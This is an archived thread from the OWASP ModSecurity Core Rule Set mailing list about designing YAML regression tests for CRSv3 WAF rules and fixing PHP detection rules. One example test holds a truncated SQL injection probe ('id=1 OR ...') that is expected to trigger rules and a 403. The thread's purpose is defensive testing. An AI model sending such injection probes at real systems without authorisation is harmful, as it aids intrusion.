We desperately need QA for the core rules.

Alternatively, we could also get hold of Walter and dump his
brain into an analysis engine. His familiarity with all the
individual rules is most exceptional.

Christian


--
Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent.
-- Andr? Gide


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set<http://scanmail.trustwave.com/?c=4062&d=kc_Q1oM1YR_rcMW4t6crL9CqZTsho19pU58WBOZf2Q&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fowasp-modsecurity-core-rule-set>

--
Walter Hop | PGP key: https://lifeforms.nl/pgp<http://scanmail.trustwave.com/?c=4062&d=kc_Q1oM1YR_rcMW4t6crL9CqZTsho19pU50VDeAO1g&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp>


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160226/a56359a4/attachment-0001.html>

From christian.folini at netnea.com  Sat Feb 27 05:12:47 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sat, 27 Feb 2016 06:12:47 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
References: <20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>
	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>
	<D2F0DDE7.1A900%csanders@trustwave.com>
	<A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
Message-ID: <20160227051247.GA13394@elias>

Walter,

This is nice. I have tested many http checkers through the years, but
somehow they all sucked. Your choice of YAML looks valid to me, I might
give it a go next week or so.

A few feature-related questions :
- It says it has the ability to consume cookies. Can you delete them as
  well?
- Can you load data from an external file (passwords spring to mind)?
- Can I extract a token from a page and use it on a subsequent request?
- What is the behaviour with multiple http request headers of the same
  name?
- Can you control the order of http headers?
- It follows redirects. But I can't check for the redirect status code?
- I can't test for the content of a http response header, can I?
- Can I test for status code _and_ content?

Sorry if this is just nitpicking. I know these are advanced features,
but they are the reason I come back to ugly shell/curl hacks after a
week with any http checker.

Ahoj,

Christian



On Fri, Feb 26, 2016 at 10:47:40PM +0100, Walter Hop wrote:
> I use a little home-built thing to do these kinds of regression tests on our own web services. It walks through a YAML file with tests: https://github.com/lifeforms/httpcheck
> 
> I started to write tests for CRSv3, but I didn?t get very far, because I got stuck on the PHP rules issue. Here is the start of my httpcheck manifest with some SQLi tests: http://lf.ms/crsv3.yaml
> I just do 'httpcheck -i crsv3.yaml -u http://localhost/' to run them on a server.
> 
> It?s in Go though, because I wanted to test lots of servers concurrently and I wanted it to be fast, so it was a good excuse to try Go. Maybe it?s even a good excuse to learn about its C bindings with libmodsecurity in the future :)
> 
> Ultimately it could be any tool, I?m not really familiar with the Python world, but I?m in favor of anything that makes it very easy to write a test. Something like just adding a simple line to a file, but with options for doing advanced stuff like POST data, cookies and custom headers. I personally hate writing correct JSON (that trailing comma?) or XML. But I find YAML pretty nice for this case.
> 
> Cheers!
> WH
> 
> > On 22 Feb 2016, at 21:47, Chaim Sanders <CSanders at trustwave.com> wrote:
> > 
> > You?ll note that I have a ticket for updating the regression tests. I
> > think that this is something that we should look into more. Potentially, a
> > framework that leverages Python?s Requests Library? My strong preference
> > is towards python in these types of things, I might be convinced into
> > using bash curl. Perl need not apply :-P thoughts?
> > 
> > On 2/22/16, 3:03 PM, "Christian Folini" <christian.folini at netnea.com>
> > wrote:
> > 
> >> On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:
> >>> Actually I?m really shocked about this. But this is why we have a
> >>> community :).
> >> 
> >> We desperately need QA for the core rules.
> >> 
> >> Alternatively, we could also get hold of Walter and dump his
> >> brain into an analysis engine. His familiarity with all the
> >> individual rules is most exceptional.
> >> 
> >> Christian
> >> 
> >> 
> >> --
> >> Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent.
> >> -- Andr? Gide
> > 
> > 
> > ________________________________
> > 
> > This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> 
> -- 
> Walter Hop | PGP key: https://lifeforms.nl/pgp
> 

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From CSanders at trustwave.com  Sat Feb 27 17:56:07 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Sat, 27 Feb 2016 17:56:07 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <20160227051247.GA13394@elias>
References: <20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>	<D2F0DDE7.1A900%csanders@trustwave.com>
	<A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
	<20160227051247.GA13394@elias>
Message-ID: <DM2PR0701MB12959905C9E2216A36004AE7DBB80@DM2PR0701MB1295.namprd07.prod.outlook.com>

Walter,
I Love this concept. So much so that I have started constructing my own based on a very similar concept (https://github.com/csanders-git/owasp-crs-regressions). I have expanded the idea of the yaml script such that it has input and output (so that I can support Christians content comparison). Additionally, I have started designing it so that it will be able to call both python Requests (similar as to what you've done) and output curl commands for research purposes. I'll use Christian's list as a glossary of features to add. I would have adopted it from GO but since the formats are similar, I figured it might be possible to just have an alternative GO client, and I'm not cool enough to GO :-). I'll keep developing but mine should have no problem taking a superset of yours (or being quickly adapted to taking your yaml scripts) because of the defaults. This should make them fairly interoperable. Thoughts?

Chaim Sanders
Security Researcher, SpiderLabs

Trustwave |?SMART SECURITY ON DEMAND
www.trustwave.com

-----Original Message-----
From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Christian Folini
Sent: Saturday, February 27, 2016 12:13 AM
To: Walter Hop
Cc: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial ...

Walter,

This is nice. I have tested many http checkers through the years, but somehow they all sucked. Your choice of YAML looks valid to me, I might give it a go next week or so.

A few feature-related questions :
- It says it has the ability to consume cookies. Can you delete them as
  well?
- Can you load data from an external file (passwords spring to mind)?
- Can I extract a token from a page and use it on a subsequent request?
- What is the behaviour with multiple http request headers of the same
  name?
- Can you control the order of http headers?
- It follows redirects. But I can't check for the redirect status code?
- I can't test for the content of a http response header, can I?
- Can I test for status code _and_ content?

Sorry if this is just nitpicking. I know these are advanced features, but they are the reason I come back to ugly shell/curl hacks after a week with any http checker.

Ahoj,

Christian



On Fri, Feb 26, 2016 at 10:47:40PM +0100, Walter Hop wrote:
> I use a little home-built thing to do these kinds of regression tests
> on our own web services. It walks through a YAML file with tests:
> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
> vS3v2gRV6ZDw&s=5&u=https%3a%2f%2fgithub%2ecom%2flifeforms%2fhttpcheck
>
> I started to write tests for CRSv3, but I didn?t get very far, because
> I got stuck on the PHP rules issue. Here is the start of my httpcheck
> manifest with some SQLi tests:
> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
> vS3q3-FVzIWQ&s=5&u=http%3a%2f%2flf%2ems%2fcrsv3%2eyaml
> I just do 'httpcheck -i crsv3.yaml -u http://localhost/' to run them on a server.
>
> It?s in Go though, because I wanted to test lots of servers
> concurrently and I wanted it to be fast, so it was a good excuse to
> try Go. Maybe it?s even a good excuse to learn about its C bindings
> with libmodsecurity in the future :)
>
> Ultimately it could be any tool, I?m not really familiar with the Python world, but I?m in favor of anything that makes it very easy to write a test. Something like just adding a simple line to a file, but with options for doing advanced stuff like POST data, cookies and custom headers. I personally hate writing correct JSON (that trailing comma?) or XML. But I find YAML pretty nice for this case.
>
> Cheers!
> WH
>
> > On 22 Feb 2016, at 21:47, Chaim Sanders <CSanders at trustwave.com> wrote:
> >
> > You?ll note that I have a ticket for updating the regression tests.
> > I think that this is something that we should look into more.
> > Potentially, a framework that leverages Python?s Requests Library?
> > My strong preference is towards python in these types of things, I
> > might be convinced into using bash curl. Perl need not apply :-P thoughts?
> >
> > On 2/22/16, 3:03 PM, "Christian Folini"
> > <christian.folini at netnea.com>
> > wrote:
> >
> >> On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:
> >>> Actually I?m really shocked about this. But this is why we have a
> >>> community :).
> >>
> >> We desperately need QA for the core rules.
> >>
> >> Alternatively, we could also get hold of Walter and dump his brain
> >> into an analysis engine. His familiarity with all the individual
> >> rules is most exceptional.
> >>
> >> Christian
> >>
> >>
> >> --
> >> Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent.
> >> -- Andr? Gide
> >
> >
> > ________________________________
> >
> > This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGF
> > gxvS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2fl
> > istinfo%2fowasp-modsecurity-core-rule-set
>
> --
> Walter Hop | PGP key:
> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
> vS3q_1QQ3MDA&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp
>

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
> vS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flisti
> nfo%2fowasp-modsecurity-core-rule-set


--
mailto:christian.folini at netnea.com
http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgxvS3qijFA3GDg&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
twitter: @ChrFolini
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-set at lists.owasp.org
http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgxvS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fowasp-modsecurity-core-rule-set

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Sun Feb 28 05:18:51 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 28 Feb 2016 06:18:51 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <DM2PR0701MB12959905C9E2216A36004AE7DBB80@DM2PR0701MB1295.namprd07.prod.outlook.com>
References: <E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>
	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>
	<D2F0DDE7.1A900%csanders@trustwave.com>
	<A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
	<20160227051247.GA13394@elias>
	<DM2PR0701MB12959905C9E2216A36004AE7DBB80@DM2PR0701MB1295.namprd07.prod.outlook.com>
Message-ID: <20160228051851.GE9494@elias>

Chaim,

On Sat, Feb 27, 2016 at 05:56:07PM +0000, Chaim Sanders wrote:
> Additionally, I have started designing it so that it will be able to call both python Requests (similar as to what you've done) and output curl commands for research purposes. 

That is neat.

> I'll use Christian's list as a glossary of features to add.

;)

Cheers,

Christian


-- 
I wanted you to see what real courage is, instead of getting the idea
that courage is a man with a gun in his hand. It's when you know you're
licked before you begin, but you begin anyway and see it through no
matter what.
-- Harper Lee

From modsec at spam.lifeforms.nl  Sun Feb 28 16:54:53 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sun, 28 Feb 2016 17:54:53 +0100
Subject: [Owasp-modsecurity-core-rule-set] CRSv3 PHP issues
Message-ID: <F49BAA9F-18BE-40E8-B7FD-89513930F12E@spam.lifeforms.nl>

Hi everybody,

As discussed earlier, I've found quite some issues with the PHP-related rules in CRSv3 rc1.
To not increase the scope of the paranoia project too much, it?s better work on these issues separately.

I?ve created bugs on Github for all the problems/possible improvemenst I?ve found. Please check the bugs and add your opinions in the comments! Here is a list:

- Rules not firing: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/289
- php-function-names.data additions: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/290
- Parentheses in php-function-names.data: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/291
- php-variables.data evasions: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/293
- Detect 'variable functions?: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/294
- Add PHP specific files to lfi-os-files.data: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/295
- Generic PHP serialized object injection: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/273

I?ll probably have time to start working on these from next week on, so it would be nice to get as much input as possible during this week.

Cheers!
WH


From modsec at spam.lifeforms.nl  Sun Feb 28 17:25:07 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sun, 28 Feb 2016 18:25:07 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
	controversial ...
In-Reply-To: <DM2PR0701MB12959905C9E2216A36004AE7DBB80@DM2PR0701MB1295.namprd07.prod.outlook.com>
References: <20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>
	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>
	<D2F0DDE7.1A900%csanders@trustwave.com>
	<A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
	<20160227051247.GA13394@elias>
	<DM2PR0701MB12959905C9E2216A36004AE7DBB80@DM2PR0701MB1295.namprd07.prod.outlook.com>
Message-ID: <CCB13FC3-EE41-496C-9B24-574713954243@spam.lifeforms.nl>

Nice!

I?m fine with anything! The beauty of YAML is that it?s so easy to parse and generate that it?s trivial to change over to another format. If you like to work in Python, that might have the added advantage that it can be switched over from making HTTP requests to libmodsecurity?s Python bindings in the future. It would be most cool to run it with libmodsecurity on a ruleset, and assert that specific rules must be triggered:

    - test:
        input:
            method: 'GET'
            url: ?/?id=1%20OR%20...?
        output:
            rules: [901234, 912345]
            status: 403

This functionality is present in the old regression-tests too, but I haven?t actually run it. That old testing framework also has another advantage which Christian suggested in a private mail (and which would be hard to do with the Go http client): you can really mold the complete request text, so you can generate HTTP protocol violations and other advanced things. I don?t know if the Python Requests library allows to just send a custom blurb over the socket. If so, it would be very cool to copy over the old tests from regression-tests/ too. They could take a format like:

        input:
            raw: ?GET / HTTP/1.0...'

Cheers!
WH

> On 27 Feb 2016, at 18:56, Chaim Sanders <CSanders at trustwave.com> wrote:
> 
> Walter,
> I Love this concept. So much so that I have started constructing my own based on a very similar concept (https://github.com/csanders-git/owasp-crs-regressions). I have expanded the idea of the yaml script such that it has input and output (so that I can support Christians content comparison). Additionally, I have started designing it so that it will be able to call both python Requests (similar as to what you've done) and output curl commands for research purposes. I'll use Christian's list as a glossary of features to add. I would have adopted it from GO but since the formats are similar, I figured it might be possible to just have an alternative GO client, and I'm not cool enough to GO :-). I'll keep developing but mine should have no problem taking a superset of yours (or being quickly adapted to taking your yaml scripts) because of the defaults. This should make them fairly interoperable. Thoughts?
> 
> Chaim Sanders
> Security Researcher, SpiderLabs
> 
> Trustwave | SMART SECURITY ON DEMAND
> www.trustwave.com
> 
> -----Original Message-----
> From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Christian Folini
> Sent: Saturday, February 27, 2016 12:13 AM
> To: Walter Hop
> Cc: owasp-modsecurity-core-rule-set at lists.owasp.org
> Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial ...
> 
> Walter,
> 
> This is nice. I have tested many http checkers through the years, but somehow they all sucked. Your choice of YAML looks valid to me, I might give it a go next week or so.
> 
> A few feature-related questions :
> - It says it has the ability to consume cookies. Can you delete them as
>  well?
> - Can you load data from an external file (passwords spring to mind)?
> - Can I extract a token from a page and use it on a subsequent request?
> - What is the behaviour with multiple http request headers of the same
>  name?
> - Can you control the order of http headers?
> - It follows redirects. But I can't check for the redirect status code?
> - I can't test for the content of a http response header, can I?
> - Can I test for status code _and_ content?
> 
> Sorry if this is just nitpicking. I know these are advanced features, but they are the reason I come back to ugly shell/curl hacks after a week with any http checker.
> 
> Ahoj,
> 
> Christian
> 
> 
> 
> On Fri, Feb 26, 2016 at 10:47:40PM +0100, Walter Hop wrote:
>> I use a little home-built thing to do these kinds of regression tests
>> on our own web services. It walks through a YAML file with tests:
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
>> vS3v2gRV6ZDw&s=5&u=https%3a%2f%2fgithub%2ecom%2flifeforms%2fhttpcheck
>> 
>> I started to write tests for CRSv3, but I didn?t get very far, because
>> I got stuck on the PHP rules issue. Here is the start of my httpcheck
>> manifest with some SQLi tests:
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
>> vS3q3-FVzIWQ&s=5&u=http%3a%2f%2flf%2ems%2fcrsv3%2eyaml
>> I just do 'httpcheck -i crsv3.yaml -u http://localhost/' to run them on a server.
>> 
>> It?s in Go though, because I wanted to test lots of servers
>> concurrently and I wanted it to be fast, so it was a good excuse to
>> try Go. Maybe it?s even a good excuse to learn about its C bindings
>> with libmodsecurity in the future :)
>> 
>> Ultimately it could be any tool, I?m not really familiar with the Python world, but I?m in favor of anything that makes it very easy to write a test. Something like just adding a simple line to a file, but with options for doing advanced stuff like POST data, cookies and custom headers. I personally hate writing correct JSON (that trailing comma?) or XML. But I find YAML pretty nice for this case.
>> 
>> Cheers!
>> WH
>> 
>>> On 22 Feb 2016, at 21:47, Chaim Sanders <CSanders at trustwave.com> wrote:
>>> 
>>> You?ll note that I have a ticket for updating the regression tests.
>>> I think that this is something that we should look into more.
>>> Potentially, a framework that leverages Python?s Requests Library?
>>> My strong preference is towards python in these types of things, I
>>> might be convinced into using bash curl. Perl need not apply :-P thoughts?
>>> 
>>> On 2/22/16, 3:03 PM, "Christian Folini"
>>> <christian.folini at netnea.com>
>>> wrote:
>>> 
>>>> On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:
>>>>> Actually I?m really shocked about this. But this is why we have a
>>>>> community :).
>>>> 
>>>> We desperately need QA for the core rules.
>>>> 
>>>> Alternatively, we could also get hold of Walter and dump his brain
>>>> into an analysis engine. His familiarity with all the individual
>>>> rules is most exceptional.
>>>> 
>>>> Christian
>>>> 
>>>> 
>>>> --
>>>> Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent.
>>>> -- Andr? Gide
>>> 
>>> 
>>> ________________________________
>>> 
>>> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGF
>>> gxvS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2fl
>>> istinfo%2fowasp-modsecurity-core-rule-set
>> 
>> --
>> Walter Hop | PGP key:
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
>> vS3q_1QQ3MDA&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp
>> 
> 
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgx
>> vS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flisti
>> nfo%2fowasp-modsecurity-core-rule-set
> 
> 
> --
> mailto:christian.folini at netnea.com
> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgxvS3qijFA3GDg&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-set at lists.owasp.org
> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFgxvS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fowasp-modsecurity-core-rule-set
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From christian.folini at netnea.com  Sun Feb 28 21:42:34 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 28 Feb 2016 22:42:34 +0100
Subject: [Owasp-modsecurity-core-rule-set] CRSv3 PHP issues
In-Reply-To: <F49BAA9F-18BE-40E8-B7FD-89513930F12E@spam.lifeforms.nl>
References: <F49BAA9F-18BE-40E8-B7FD-89513930F12E@spam.lifeforms.nl>
Message-ID: <20160228214234.GE32723@elias>

Hey Walter,

On Sun, Feb 28, 2016 at 05:54:53PM +0100, Walter Hop wrote:
> - Rules not firing: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/289
> - php-function-names.data additions: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/290
> - Parentheses in php-function-names.data: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/291
> - php-variables.data evasions: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/293
> - Detect 'variable functions?: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/294
> - Add PHP specific files to lfi-os-files.data: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/295
> - Generic PHP serialized object injection: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/273

That's an impressive list. Very cool.

Given the abundance of PHP CMS exploits, these rule improvements make
a lot of sense. I am glad to see you attacking them.

I hope to finish the paranoid stuff asap. Once the first pull
request goes through, we are ready to push the rest.

Cheers,

Christian


-- 
A happy life consists not in the absence, but in the mastery of
hardships.  
--- Helen Keller

From CSanders at trustwave.com  Sun Feb 28 22:09:12 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Sun, 28 Feb 2016 22:09:12 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode:
	Forgotten	controversial ...
In-Reply-To: <CCB13FC3-EE41-496C-9B24-574713954243@spam.lifeforms.nl>
References: <20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>	<D2F0DDE7.1A900%csanders@trustwave.com>
	<A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
	<20160227051247.GA13394@elias>
	<DM2PR0701MB12959905C9E2216A36004AE7DBB80@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<CCB13FC3-EE41-496C-9B24-574713954243@spam.lifeforms.nl>
Message-ID: <DM2PR0701MB1295E99A116F07D64636BF69DBB90@DM2PR0701MB1295.namprd07.prod.outlook.com>

Yes, I ran into this exact problem with Python Requests - it doesn't support the level of control I Need!. However I circumvented this because if an element is set that cannot be issued with requests (For instance HTTP version), it will seamlessly switch to a socket instead. Indeed libmodsecurities python bindings ARE exactly why I went with python, however GO does have very good capabilities to execute C code, so this is another viable alternative. I am really excited to see us ensure that specific rules trigger, I think this will be the most helpful aspect.

Also Walter, I am working on the labeling bit :)

Chaim Sanders
Security Researcher, SpiderLabs

Trustwave |?SMART SECURITY ON DEMAND
www.trustwave.com


-----Original Message-----
From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Walter Hop
Sent: Sunday, February 28, 2016 12:25 PM
To: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial ...

Nice!

I?m fine with anything! The beauty of YAML is that it?s so easy to parse and generate that it?s trivial to change over to another format. If you like to work in Python, that might have the added advantage that it can be switched over from making HTTP requests to libmodsecurity?s Python bindings in the future. It would be most cool to run it with libmodsecurity on a ruleset, and assert that specific rules must be triggered:

    - test:
        input:
            method: 'GET'
            url: ?/?id=1%20OR%20...?
        output:
            rules: [901234, 912345]
            status: 403

This functionality is present in the old regression-tests too, but I haven?t actually run it. That old testing framework also has another advantage which Christian suggested in a private mail (and which would be hard to do with the Go http client): you can really mold the complete request text, so you can generate HTTP protocol violations and other advanced things. I don?t know if the Python Requests library allows to just send a custom blurb over the socket. If so, it would be very cool to copy over the old tests from regression-tests/ too. They could take a format like:

        input:
            raw: ?GET / HTTP/1.0...'

Cheers!
WH

> On 27 Feb 2016, at 18:56, Chaim Sanders <CSanders at trustwave.com> wrote:
>
> Walter,
> I Love this concept. So much so that I have started constructing my own based on a very similar concept (http://scanmail.trustwave.com/?c=4062&d=mLPT1kicuUFQdjfSZQGRxIQ4dFlWaS6rOnffvRW0og&s=5&u=https%3a%2f%2fgithub%2ecom%2fcsanders-git%2fowasp-crs-regressions%29 I have expanded the idea of the yaml script such that it has input and output (so that I can support Christians content comparison). Additionally, I have started designing it so that it will be able to call both python Requests (similar as to what you've done) and output curl commands for research purposes. I'll use Christian's list as a glossary of features to add. I would have adopted it from GO but since the formats are similar, I figured it might be possible to just have an alternative GO client, and I'm not cool enough to GO :-). I'll keep developing but mine should have no problem taking a superset of yours (or being quickly adapted to taking your yaml scripts) because of the defaults. This should make them fairly interoperable. Thoughts?
>
> Chaim Sanders
> Security Researcher, SpiderLabs
>
> Trustwave | SMART SECURITY ON DEMAND
> www.trustwave.com
>
> -----Original Message-----
> From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On
> Behalf Of Christian Folini
> Sent: Saturday, February 27, 2016 12:13 AM
> To: Walter Hop
